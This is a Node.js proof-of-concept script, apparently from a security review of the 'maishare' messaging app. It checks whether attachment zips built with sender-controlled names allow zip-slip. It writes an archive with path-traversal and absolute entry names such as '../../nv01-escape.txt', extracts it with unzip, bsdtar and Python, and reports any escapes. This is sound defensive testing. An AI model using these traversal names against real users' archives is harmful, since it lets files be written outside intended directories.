// NV-01 (zip-slip): can a malicious attachment name traverse directories when
// the receiver saves the gallery/attachment zip? The app bundles attachments
// with fflate zipSync under the sender-controlled file name (see zipBlobs in
// Conversation.tsx). This script reproduces that exact archive and then
// extracts it with every extractor available on this machine, reporting
// whether each one normalizes traversal entry names.
//
// Local only — no deployment needed.
import { zipSync, strToU8 } from "fflate";
import { execFileSync } from "node:child_process";
import { mkdtempSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const PAYLOAD = "maishare nv-01 probe";
// names a hostile sender can put on the wire (file.name is unvalidated)
const EVIL_NAMES = ["../../nv01-escape.txt", "sub/../../../nv01-deep.txt", "/abs-nv01.txt"];

const entries = {};
EVIL_NAMES.forEach((n, i) => (entries[n] = strToU8(`${PAYLOAD} ${i}`)));
const good = strToU8(PAYLOAD);
entries["innocent.txt"] = good;
const zip = zipSync(entries, { level: 0 });

const dir = mkdtempSync(join(tmpdir(), "nv01-"));
const zipPath = join(dir, "probe.zip");
(await import("node:fs")).writeFileSync(zipPath, zip);

console.log("== archive listing (entry names as stored) ==");
let listing = "";
const tools = [
  { cmd: "unzip", args: ["-l", zipPath] },
  { cmd: "bsdtar", args: ["-tf", zipPath] },
  { cmd: "tar", args: ["-tf", zipPath] },
  {
    cmd: "python3",
    args: [
      "-c",
      `import zipfile,sys;[print(m.filename) for m in zipfile.ZipFile(${JSON.stringify(zipPath)}).infolist()]`,
    ],
  },
];
for (const t of tools) {
  try {
    listing = execFileSync(t.cmd, t.args, { encoding: "utf8" });
    console.log(
      `[${t.cmd}]` +
        (listing.includes("..") || listing.startsWith("/")
          ? "  -> stores traversal names VERBATIM"
          : "  (no traversal names shown)"),
    );
    break;
  } catch {
    /* tool missing — try next */
  }
}
console.log(listing.trim());

// escape detector: anything landing OUTSIDE the extraction dir proves the
// extractor followed traversal paths
function outsideExists() {
  const outside = [
    join(dir, "..", "nv01-escape.txt"),
    join(tmpdir(), "nv01-escape.txt"),
    join(tmpdir(), "nv01-deep.txt"),
  ];
  return outside.filter(existsSync);
}

console.log("\n== extraction behavior per extractor ==");
const extractors = [
  { cmd: "unzip", args: [zipPath, "-d"] },
  { cmd: "bsdtar", args: ["-xf", zipPath, "-C"] },
  {
    cmd: "python3",
    args: [
      "-c",
      `import zipfile,sys;zipfile.ZipFile(${JSON.stringify(zipPath)}).extractall(sys.argv[1])`,
    ],
  },
];
for (const ex of extractors) {
  const target = mkdtempSync(join(tmpdir(), "nv01-x-"));
  try {
    execFileSync(ex.cmd, [...ex.args, target], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    });
    const escaped = outsideExists();
    console.log(
      `[${ex.cmd}] escaped: ${escaped.length ? "YES -> " + escaped.join(", ") : "no"}` +
        (existsSync(join(target, "innocent.txt")) ? " (normal entries extracted)" : ""),
    );
    if (escaped.length) escaped.forEach((f) => rmSync(f, { force: true }));
  } catch (err) {
    console.log(`[${ex.cmd}] extraction refused/failed: ${String(err.message).split("\n")[0]}`);
  }
  rmSync(target, { recursive: true, force: true });
}
rmSync(dir, { recursive: true, force: true });

console.log(
  "\nRESULT nv-01: recorded in nv-observations.md — 'validated' only if some" +
    " extractor above shows escaped: YES; the fleet survey (what extractors" +
    " recipients actually use) stays an owner step.",
);
